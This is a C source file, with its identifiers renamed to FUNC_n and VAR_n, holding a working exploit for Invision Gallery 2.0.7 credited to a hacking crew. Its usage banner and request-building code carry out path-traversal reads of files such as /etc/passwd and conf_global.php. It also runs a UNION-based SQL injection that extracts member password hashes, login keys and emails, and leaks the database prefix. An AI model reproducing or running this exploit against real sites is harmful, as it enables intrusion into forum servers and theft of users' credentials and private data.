
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int FUNC_0 (char*,char*,char*) ;
 int FUNC_1 (char*) ;
 int FUNC_2 (char*,char*) ;
 scalar_t__ FUNC_3 (char*,char*) ;
 int FUNC_4 (char*,char*) ;

int FUNC_5(int VAR_0,char * VAR_1[])
{
 FUNC_1("\n ...............................................................\n");
    FUNC_1("  Invision Gallery 2.0.7 ReadFile() & SQL injection exploit       \n");
    FUNC_1("         (c)oded by _1nf3ct0r_ // Hell Knights Crew               \n");
    FUNC_1("       ported by ShadOS(Linux) // Hell Knights Crew               \n");
 FUNC_1("               http://hellknights.void.ru/                        \n");
 FUNC_1("  Gr33tz: blackybr, 1dt.w0lf, ShadOS, ZaCo, SkvoznoY, HATS-Team   \n");
 FUNC_1(" ...............................................................  \n");

 if (VAR_0 == 1) {
    FUNC_1("\n\n [+] ReadFile():\n");
    FUNC_1("  - syntax:\n");
    FUNC_1("  readfile 1 <host> <pathtoindex> <localfile> \n");
    FUNC_1("  readfile 2 <host> <pathtoindex> <localfile>   -- try it 1f readfile[1] failed \n");
    FUNC_1("  - params: \n");
    FUNC_1("  <localfile> -  path to local file (../file), f0r example: ../../../../../etc/passwd\n");
    FUNC_1("  s0, 1f u want to get local path to IPB 7ry th1s: ../../hellknightscrewxploit  \n");
    FUNC_1("  - examples:\n");
    FUNC_1("  readfile 1 asd.ru index.php ../../../../../../etc/passwd\n");
    FUNC_1("  readfile 1 asd.ru forum/index.php ../../conf_global.php\n");
    FUNC_1("  readfile 1 asd.ru forum/index.php ../../conf_global.php%00\n\n\n");
    FUNC_1(" [+] SQL-injection:\n");
    FUNC_1("  - syntax\n");
    FUNC_1("  sqlinject <host> <pathtoindex> <member_id> <prefix> <column> <table>\n");
    FUNC_1("  getprefix <host> <pathtoindex>   -- get database prefix from IPB error  \n");
    FUNC_1("  - params:\n");
    FUNC_1("  <member_id> -  member's id for SQL-injection result, for example: 1\n");
    FUNC_1("  <column>    -  ipb members' column to get. for example: ip_adress, email.\n");
    FUNC_1("  <table>     -  ipb table to use. f0r example: member\n");
    FUNC_1("  <prefix>    -  database prefix. \n");
    FUNC_1("  - examples:\n");
    FUNC_1("  ig.exe sqlinject asd.ru index.php legacy_password ibf_ members 1  \n");
    FUNC_1("  ig.exe sqlinject asd.ru index.php member_login_key  ibf_ members 1\n");
    FUNC_1("  ig.exe sqlinject asd.ru forum/index.php ip_adress ibf_ member 5\n\n");
 return 1;
 }


char * VAR_2 = VAR_1[1];
char VAR_3[1024];
if (FUNC_3(VAR_2,"readfile")==0)
{
 char * VAR_4 = VAR_1[2];
 char * VAR_5 = ((void*)0); VAR_5 = VAR_1[4];
 char * VAR_6 = VAR_1[5];
 char * VAR_7 = VAR_1[3];
 if (FUNC_3(VAR_4,"1")==0)
 {
 FUNC_4(VAR_3, "GET /");
 FUNC_2(VAR_3, VAR_5);
 FUNC_2(VAR_3, "?act=module&module=gallery&cmd=viewimage&img=&file_type=&dir=");
 FUNC_2(VAR_3, VAR_6);
    FUNC_2(VAR_3, " HTTP/1.0\r\nHost: ");
 FUNC_2(VAR_3, VAR_7);
 FUNC_2(VAR_3, "\r\n\r\n");
 FUNC_0(VAR_3, "readfile", VAR_7);
 }
 else if (FUNC_3(VAR_4,"2")==0)
 {
 FUNC_4(VAR_3, "GET /");
 FUNC_2(VAR_3, VAR_5);
 FUNC_2(VAR_3, "?act=gallery&code=viewimage&img=index.gif&dir=");
 FUNC_2(VAR_3, VAR_6);
    FUNC_2(VAR_3, " HTTP/1.0\r\nHost: ");
 FUNC_2(VAR_3, VAR_7);
 FUNC_2(VAR_3, "\r\n\r\n");
 FUNC_0(VAR_3, "readfile", VAR_7);
 }


}
if(FUNC_3(VAR_2,"sqlinject")==0)
{
 char * VAR_8 = VAR_1[2];
 char * VAR_9 = VAR_1[3];
 char * VAR_10 = VAR_1[5];
 char * VAR_11 = VAR_1[4];
 char * VAR_12 = VAR_1[6];
 char * VAR_13 = VAR_1[7];

 FUNC_4(VAR_3, "GET /");
 FUNC_2(VAR_3, VAR_9);
 FUNC_2(VAR_3, "?automodule=gallery&cmd=rate&img=1&rating=1&album=-1%20union%20select%201,");
 FUNC_2(VAR_3, VAR_11);
 FUNC_2(VAR_3, ",1,1,1,1,1,1,1,1%20FROM%20");
 FUNC_2(VAR_3, VAR_10);
 FUNC_2(VAR_3, VAR_12);
 FUNC_2(VAR_3, "%20WHERE%20id=");
 FUNC_2(VAR_3, VAR_13);
 FUNC_2(VAR_3, "/*31337*/");
    FUNC_2(VAR_3, " HTTP/1.0\r\nHost: ");
 FUNC_2(VAR_3, VAR_8);
 FUNC_2(VAR_3, "\r\n\r\n");
    FUNC_0(VAR_3, "sqlinject", VAR_8);
}
if (FUNC_3(VAR_2,"getprefix")==0)
{
 char * VAR_14 = VAR_1[3];
 char * VAR_15 = VAR_1[2];

 FUNC_4(VAR_3, "GET /");
 FUNC_2(VAR_3, VAR_14);
 FUNC_2(VAR_3, "?automodule=gallery&cmd=rate&img=1&rating=1&album=-1%20hellknightscrew");
    FUNC_2(VAR_3, " HTTP/1.0\r\nHost: ");
 FUNC_2(VAR_3, VAR_15);
 FUNC_2(VAR_3, "\r\n\r\n");
 FUNC_1("\n\n\n[!] u can get database prefix from this error. example: SELECT * FROM <PREFIX>gallery_albums\n\n");
 FUNC_0(VAR_3, "readfile", VAR_15);
 FUNC_1("\n\n");
}
 return 0;
}
